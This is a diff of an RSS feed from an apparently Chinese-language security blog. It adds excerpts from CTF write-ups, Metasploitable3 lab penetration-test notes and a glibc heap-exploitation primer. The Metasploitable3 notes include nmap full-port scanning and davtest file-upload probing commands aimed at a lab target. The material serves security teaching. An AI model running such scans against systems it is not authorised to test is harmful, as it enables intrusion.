 &lt;pre tabindex="0">&lt;code>Welcome to the Quantum Nim Heist, where traditional logic intertwines with the enigmatic realm of quantum mechanics to create a Nim game like no other.
-&lt;/code>&lt;/pr</description></item><item><title>【資訊安全】Metasploitable3 滲透測試實作（筆記）</title><link>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</link><pubDate>Sat, 20 Apr 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</guid><description>&lt;h2 id="先備知識">先備知識&lt;/h2>
+&lt;/code>&lt;/pre>&lt;p>跟電腦玩 Nim 遊戲，&lt;a href="https://en.wikipedia.org/wiki/Nim">Wiki - Nim&lt;/a>，&lt;/p>
+&lt;p>這裡的規則是拿走最後一棵石頭的人獲勝，而根據組合賽局理論，把每堆石頭數 XOR 後若為 0 則後手必勝，否則先手必勝。&lt;/p>
+&lt;p>看到 &lt;code>server.py&lt;/code>&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">def&lt;/span> &lt;span style="color:#50fa7b">menu&lt;/span>():
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_main_menu()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choice &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">input&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#39;what would you like to do? &amp;#39;&lt;/span>)&lt;span style="color:#ff79c6">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> choice &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;0&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_rules()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">elif&lt;/span> choice &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;1&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> game &lt;span style="color:#ff79c6">=&lt;/span> Game()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> game&lt;span style="color:#ff79c6">.&lt;/span>generate_losing_game()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> play(game)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">elif&lt;/span> choice &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;2&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> saved &lt;span style="color:#ff79c6">=&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">input&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#39;enter the saved game: &amp;#39;&lt;/span>)&lt;span style="color:#ff79c6">.&lt;/span>strip()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> game_str, digest &lt;span style="color:#ff79c6">=&lt;/span> saved&lt;span style="color:#ff79c6">.&lt;/span>split(&lt;span style="color:#f1fa8c">&amp;#39;:&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span> &lt;span style="color:#8be9fd;font-style:italic">hash&lt;/span>&lt;span style="color:#ff79c6">.&lt;/span>hexdigest(game_str&lt;span style="color:#ff79c6">.&lt;/span>encode()) &lt;span style="color:#ff79c6">==&lt;/span> digest:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> game &lt;span style="color:#ff79c6">=&lt;/span> Game()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> game&lt;span style="color:#ff79c6">.&lt;/span>load(game_str)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> play(game)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">else&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print_error(&lt;span style="color:#f1fa8c">&amp;#39;invalid game provided!&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">elif&lt;/span> choice &lt;span style="color:#ff79c6">==&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;3&amp;#39;&lt;/span>:
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#8be9fd;font-style:italic">print&lt;/span>(&lt;span style="color:#f1fa8c">&amp;#39;omg bye!&amp;#39;&lt;/span>)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#bd93f9">0&lt;/span>)
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>可以發現一定會生一個玩家必輸的局面，看看遊戲的操作選項&lt;/p></description></item><item><title>【資訊安全】Metasploitable3 滲透測試實作（筆記）</title><link>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</link><pubDate>Sat, 20 Apr 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2024/metasploitable3_writeup/</guid><description>&lt;h2 id="先備知識">先備知識&lt;/h2>
 &lt;ul>
 &lt;li>知道如何使用 VMware 或 VirtualBox&lt;/li>
 &lt;li>Kali Linux 基本操作&lt;/li>
@@ -1140,7 +1958,33 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;/code>&lt;/pre>&lt;/td>
 &lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
 &lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>ifconfig
-&lt;/span>&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【HTB Challenge】Sacred Scrolls: Revenge</title><link>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</link><pubDate>Tue, 05 Mar 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</guid><description>&lt;h1 id="htb-challengesacred-scrolls-revenge">【HTB Challenge】Sacred Scrolls: Revenge&lt;/h1>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="弱點掃描">弱點掃描&lt;/h2>
+&lt;p>使用 Nmap 將所有 port 掃描一遍，查看主機上開啟的 Service&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>sudo nmap -sV -sS -n -v --reason --open -p- &amp;lt;Metasploitable3 IP&amp;gt;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&amp;lt;Metasploitable3 IP&amp;gt; 請替換成靶機 IP&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable3/nmap_1.png" alt="nmap1">&lt;/p>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable3/nmap_2.png" alt="nmap2">&lt;/p>
+&lt;h2 id="文件上傳漏洞">文件上傳漏洞&lt;/h2>
+&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable3/file_upload/uploads.png" alt="upload">&lt;/p>
+&lt;p>掃描 8585 port 是否存在文件上傳漏洞&lt;/p>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>davtest -url http://&amp;lt;Metasploitable3 IP&amp;gt;:8585/uploads/
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://ja-errorpro.codes/images/metasploitable3/file_upload/davtest.png" alt="davtest">&lt;/p></description></item><item><title>【HTB Challenge】Sacred Scrolls: Revenge</title><link>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</link><pubDate>Tue, 05 Mar 2024 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/HTB/Sacred-Scrolls-Revenge/</guid><description>&lt;h1 id="htb-challengesacred-scrolls-revenge">【HTB Challenge】Sacred Scrolls: Revenge&lt;/h1>
 &lt;h2 id="description">Description&lt;/h2>
 &lt;p>Each house of the campus has its own secret library to store spells or spellbound messages so the others cannot see them. Messages are encrypted and must be signed by the boy who lived, turning them into sacred scrolls, otherwise they are not accepted in this library. You can try it yourself as long as you are a wizard of this house.&lt;/p>
 &lt;h2 id="checksec">Checksec&lt;/h2>
@@ -1153,7 +1997,19 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF】Heap Exploitation(Part 1 - Overview, UAF)</title><link>https://ja-errorpro.codes/posts/2023/ctf_heap/</link><pubDate>Thu, 16 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_heap/</guid><description>&lt;h1 id="heap-exploitation">Heap Exploitation&lt;/h1>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-sh" data-lang="sh">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">[&lt;/span>*&lt;span style="color:#ff79c6">]&lt;/span> &lt;span style="color:#f1fa8c">&amp;#39;/home/err0rpro/CTFLab/Hackthebox/SacredScrollsRevenge/sacred_scrolls&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Arch: amd64-64-little
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RELRO: Full RELRO
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Stack: No canary found
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> NX: NX enabled
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> PIE: No PIE &lt;span style="color:#ff79c6">(&lt;/span>0x400000&lt;span style="color:#ff79c6">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> RUNPATH: b&lt;span style="color:#f1fa8c">&amp;#39;./glibc/&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h2 id="analysis">Analysis&lt;/h2>
+&lt;p>丟到 IDA 分析程式碼&lt;/p></description></item><item><title>【CTF】Heap Exploitation(Part 1 - Overview, UAF)</title><link>https://ja-errorpro.codes/posts/2023/ctf_heap/</link><pubDate>Thu, 16 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_heap/</guid><description>&lt;h1 id="heap-exploitation">Heap Exploitation&lt;/h1>
 &lt;h2 id="預備知識">預備知識&lt;/h2>
 &lt;ul>
 &lt;li>需要注意glibc的版本&lt;/li>
@@ -1191,7 +2047,249 @@ combine the AI and CTI applications.&lt;/p>
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
 &lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
-&lt;/span>&lt;/code>&lt;/pr</description></item><item><title>【CTF】CTF工具集</title><link>https://ja-errorpro.codes/posts/2023/ctf_tools/</link><pubDate>Sun, 12 Nov 2023 00:00:00 +0800</pubDate><guid>https://ja-errorpro.codes/posts/2023/ctf_tools/</guid><description>&lt;h1 id="ctf工具集">CTF工具集&lt;/h1>
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">if&lt;/span>(要分配的大小小於&lt;span style="color:#bd93f9">128&lt;/span>KB){
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">if&lt;/span>(是第一次呼叫)
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> 呼叫 brk() &lt;span style="color:#ff79c6">-&amp;gt;&lt;/span> sys_brk() 分配 &lt;span style="color:#bd93f9">132&lt;/span>KB 的Segment，此Segment稱為 main arena
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}&lt;span style="color:#ff79c6">else&lt;/span>{ &lt;span style="color:#6272a4">// 超過128KB
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#6272a4">&lt;/span> mmap() &lt;span style="color:#ff79c6">-&amp;gt;&lt;/span> sys_mmap()
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>程式執行中free掉記憶體後不會馬上還給系統，會由glib代管&lt;/li>
+&lt;/ul>
+&lt;h3 id="chunk">Chunk&lt;/h3>
+&lt;ul>
+&lt;li>glibc做記憶體管理的資料結構&lt;/li>
+&lt;li>malloc分配的空間單位，分配出來的大小必須對齊0x10
+&lt;ul>
+&lt;li>Ex: malloc(0x15) -&amp;gt; 得到大小 0x20 + 0x10(header) 的chunk&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>依大小分類，發生free時會放到linked list中，這個linked list稱為bin
+&lt;ul>
+&lt;li>fastbin (&amp;lt;64B)&lt;/li>
+&lt;li>smallbin (&amp;lt;512B)&lt;/li>
+&lt;li>largebin (&amp;gt;=512B)&lt;/li>
+&lt;li>unsortedbin (如果free的chunk大小&amp;gt;64B，先放到這裡一段時間後再加到對應的bin)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>種類
+&lt;ul>
+&lt;li>Allocated Chunk
+&lt;ul>
+&lt;li>prev_size: 如果前一個chunk是free的，就存前一個chunk的大小&lt;/li>
+&lt;li>size: 這個chunk的大小 + Status flag(最後3個bit)(因為0x10 padding，後面4bit可以不存)
+&lt;ul>
+&lt;li>bit 0: PREV_INUSE: 前一個chunk是否正被使用&lt;/li>
+&lt;li>bit 1: IS_MMAPPED: 是否是mmap分配的&lt;/li>
+&lt;li>bit 2: NON_MAIN_ARENA: 是否不是main arena&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>User Data&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Free Chunk
+&lt;ul>
+&lt;li>prev_size&lt;/li>
+&lt;li>size&lt;/li>
+&lt;li>fd: 指標指向下一個chunk&lt;/li>
+&lt;li>bk: 指標指向上一個chunk&lt;/li>
+&lt;li>fd_nextsize: 下一個largebin的指標&lt;/li>
+&lt;li>bk_nextsize: 上一個largebin的指標&lt;/li>
+&lt;li>Data&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>Top Chunk
+&lt;ul>
+&lt;li>prev_size&lt;/li>
+&lt;li>size: 還剩多少空間&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-c" data-lang="c">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">struct&lt;/span> malloc_chunk {
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> INTERNAL_SIZE_T mchunk_prev_size; &lt;span style="color:#6272a4">/* Size of previous chunk (if free). */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> INTERNAL_SIZE_T mchunk_size; &lt;span style="color:#6272a4">/* Size in bytes, including overhead. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_chunk&lt;span style="color:#ff79c6">*&lt;/span> fd; &lt;span style="color:#6272a4">/* double links -- used only if free. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_chunk&lt;span style="color:#ff79c6">*&lt;/span> bk;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#6272a4">/* Only used for large blocks: pointer to next larger size. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_chunk&lt;span style="color:#ff79c6">*&lt;/span> fd_nextsize; &lt;span style="color:#6272a4">/* double links -- used only if free. */&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_chunk&lt;span style="color:#ff79c6">*&lt;/span> bk_nextsize;
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>};
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#ff79c6">typedef&lt;/span> &lt;span style="color:#ff79c6">struct&lt;/span> malloc_chunk&lt;span style="color:#ff79c6">*&lt;/span> mchunkptr;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h3 id="bin">bin&lt;/h3>
+&lt;ul>
+&lt;li>Linked list&lt;/li>
+&lt;li>在free掉一個chunk時，會把這個chunk放到對應的bin中&lt;/li>
+&lt;li>tcache&lt;/li>
+&lt;li>fastbin
+&lt;ul>
+&lt;li>Single Linked list&lt;/li>
+&lt;li>size &amp;lt; 64B&lt;/li>
+&lt;li>存在mfastbinptr fastbinsY[NFASTBINS]&lt;/li>
+&lt;li>最多8個&lt;/li>
+&lt;li>LIFO(Last In First Out)&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>smallbin
+&lt;ul>
+&lt;li>Circular Doubly Linked list&lt;/li>
+&lt;li>size &amp;lt; 512B&lt;/li>
+&lt;li>FIFO&lt;/li>
+&lt;li>bins[1:64]&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>largebin
+&lt;ul>
+&lt;li>Circular Doubly Linked list&lt;/li>
+&lt;li>size &amp;gt;= 512B&lt;/li>
+&lt;li>FIFO&lt;/li>
+&lt;li>free chunk 多了 fd_nextsize和bk_nextsize指標指向下一個和上一個 large chunk&lt;/li>
+&lt;li>每個bin中chunk大小不固定，存的時候會sort，大的放前面，小的放後面&lt;/li>
+&lt;li>bins[64:126]&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>unsortedbin
+&lt;ul>
+&lt;li>Circular Doubly Linked list&lt;/li>
+&lt;li>LIFO&lt;/li>
+&lt;li>malloc會先把要free的、大於64B的chunk先放到這裡整理，再放到對應的bin中&lt;/li>
+&lt;li>bins[0:0]&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h3 id="main-arena-header">Main arena header&lt;/h3>
+&lt;div class="highlight">&lt;div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+&lt;table style="border-spacing:0;padding:0;margin:0;border:0;">&lt;tr>&lt;td style="vertical-align:top;padding:0;margin:0;border:0;">
+&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+&lt;/span>&lt;span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
